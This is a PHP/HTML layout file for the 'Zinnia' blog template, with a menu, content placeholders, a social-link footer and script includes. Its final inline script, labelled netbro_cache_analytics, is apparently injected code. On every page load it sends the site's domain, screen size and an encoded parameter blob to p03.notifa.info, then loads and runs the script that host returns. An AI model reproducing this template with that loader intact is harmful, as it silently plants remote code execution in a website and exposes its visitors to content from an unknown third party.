<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Document Settings -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <!-- Page Title -->
    <title>Zinnia blog template</title>
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700|Playfair+Display:400,400i,700"
    rel="stylesheet">
    <!-- Styles -->
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/bootstrap.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/font-awesome.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/owl.carousel.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/owl.theme.default.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/font-awesome.min.css'); ?>">
    <link rel="stylesheet" href="<?= base_url('assets/frontend/css/style.css'); ?>">

    <!-- HTML5 shim and Respond.js IE9 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="assets/frontend/js/html5shiv.js"></script>
    <script src="assets/frontend/js/respond.js"></script>
<![endif]-->
</head>
<body>
    <div class="container zinnia-page">
        <header>
            <div class="zinnia-logo text-center">
                <h1><a href="<?= base_url(); ?>"><img src="<?= base_url('assets/frontend/images/logo.png'); ?>" alt=""></a></h1>
            </div>
            <div class="zinnia-menu text-center">
                <nav class="navbar">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#myNavbar">
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                    </div>
                    <div class="collapse navbar-collapse" id="myNavbar">
                        <ul class="nav navbar-nav text-uppercase">
                        <!-- <li class="dropdown">
                            <a href="index-2.html" class="dropdown-toggle" data-toggle="dropdown" role="button"
                               aria-haspopup="true" aria-expanded="false">Home</a>
                            <ul class="dropdown-menu">
                                <li class="active"><a href="index-2.html">Home Default</a></li>
                                <li><a href="index-3.html">Fixed Image background</a></li>
                                <li><a href="large-than-grid.html">1st Large Then Grid</a></li>
                                <li><a href="grid-layout.html">Grid Layout</a></li>
                                <li><a href="grid-3-columns.html">Grid 3 Columns</a></li>
                                <li><a href="large-than-list.html">1st Large Then List</a></li>
                                <li><a href="list-layout.html">List Layout</a></li>
                            </ul>
                        </li> -->
                        <!-- <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button"
                                                aria-haspopup="true" aria-expanded="false">About Us</a>
                            <ul class="dropdown-menu">
                                <li class="dropdown">
                                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button"
                                       aria-haspopup="true" aria-expanded="false">Layouts</a>
                                    <ul class="dropdown-menu">
                                        <li><a href="full-width.html">Full-width</a></li>
                                        <li><a href="index-2.html">Right Sidebar</a></li>
                                        <li><a href="left-sidebar.html">Left Sidebar</a></li>
                                    </ul>
                                </li>
                                <li><a href="single-blog.html">Standard Post</a></li>
                                <li><a href="link-post.html">Link post</a></li>
                                <li><a href="video-post.html">Video post</a></li>
                                <li><a href="audio-post.html">Audio post</a></li>
                                <li><a href="slider-post.html">Gallery Post</a></li>
                                <li><a href="contact.html">Contact one</a></li>
                                <li><a href="contact-with-map.html">Contact With Map</a></li>
                                <li><a href="archive.html">Archive</a></li>
                                <li><a href="typography.html">Typography</a></li>
                                <li><a href="404.html">404 Page</a></li>
                            </ul>
                        </li> -->
                        <li><a href="<?= base_url(); ?>">Home</a></li>
                        <li><a href="archive.html">About Us</a></li> 
                        <li><a href="<?= base_url('news'); ?>">Berita</a></li>
                        <li><a href="archive.html">Gallery</a></li>
                        <li><a href="<?= base_url('contact-us'); ?>">Contact Us</a></li>
                    </ul>
                </div>
            </nav>
        </div>
    </header>
    <div class="zinnia-main-content">
        <div class="row">

            <?php echo $slider; ?>
            <?php echo $content; ?>
            <?php echo $sidebar; ?>

        </div>
    </div>
</div>
<footer class="zinnia-footer">
    <div class="container">
    <hr/>
        <!-- <div class="footer-instagram text-center">

            <div id="footer-instagram" class="owl-carousel owl-theme">

                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-3.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-4.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-5.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-6.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-7.jpg'); ?>" alt=""></a>
                </div>
                <div class="item">
                    <a href="#"><img src="<?= base_url('assets/frontend/images/ft-insta-8.jpg'); ?>" alt=""></a>
                </div>

            </div>
            <div class="instagram-overlay-text text-uppercase">
                <h2>Zinnia @ <a href="#">Instagram</a></h2>
            </div>
        </div> -->
        <div class="footer-social">
            <!-- <div class="footer-logo text-center">
                <a href="#"> <img src="<?= base_url('assets/frontend/images/logo.png'); ?>" alt=""></a>
            </div> -->
            <div class="footer-social-link text-capitalize">
                <ul class="list-inline text-center">
                    <li><a href="#"><i class="fa fa-twitter"></i>Twitter</a></li>
                    <li><a href="#"><i class="fa fa-facebook"></i>Facebook</a></li>
                    <li><a href="#"><i class="fa fa-google-plus"></i>Google Plus</a></li>
                    <li><a href="#"><i class="fa fa-instagram"></i>Instagram</a></li>
                    <li><a href="#"><i class="fa fa-pinterest"></i>Pinterest</a></li>
                </ul>
            </div>
        </div>

    </div>
    <div class="container footer-copyright-text text-center">
        <p>&copy; 2018 Develop by  <a href="http://www.otret.com" target="_blank">Otret.com</a></p>
    </div>
</footer>
<!--//Script//-->
<script src="<?= base_url('assets/frontend/js/jquery-1.11.3.min.js'); ?>"></script>
<script src="<?= base_url('assets/frontend/js/bootstrap.min.js'); ?>"></script>
<script src="<?= base_url('assets/frontend/js/owl.carousel.min.js'); ?>"></script>
<script src="<?= base_url('assets/frontend/js/main.js'); ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mHDCn4mk92tXB37WW3pmwpt%2bIWQfaHbQofJOWoi0Lmt18a9awFhvtA%2fgQmF6IGg7f4X4eOjHfZ%2fwpH7h32rdMhYnzQHBv3f0Wipgnd9MIRnjlbFwF3ajmtMgTMC%2ftlP0ma1pgbgs0vFBDWudayfwD7Al4o0iAm1O%2f5gJ2kFKjvwTpU4O0%2bJ5ZVE8U%2bUkzJ6WCBSp8bByeTme7NcBWE2Dv6qhLfs22P8nNrxjmn2ZmQDq7jtDM2FInKUofHJL6nMoOXkOa58rXzfrEgAspw%2f9SN2TYDOMC3LYQKnT71E8HNOXYN4ZtyKSjeoi53hoRPSGLX%2beIr8iuQNLbD875VkpnTONgOCZIQkj6qEgC757DUZBgUg5hlzObd1qaqCBGzc1rpb2HUIjIGixAeqQYmoNN8hEnt3XZPDlij5iHjFpmFAH2qTnZFF%2fknGYuaG5ClAc0R7DaZQpGoUdjY8hMw%2f0c%2bZJor9D8YPUv" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>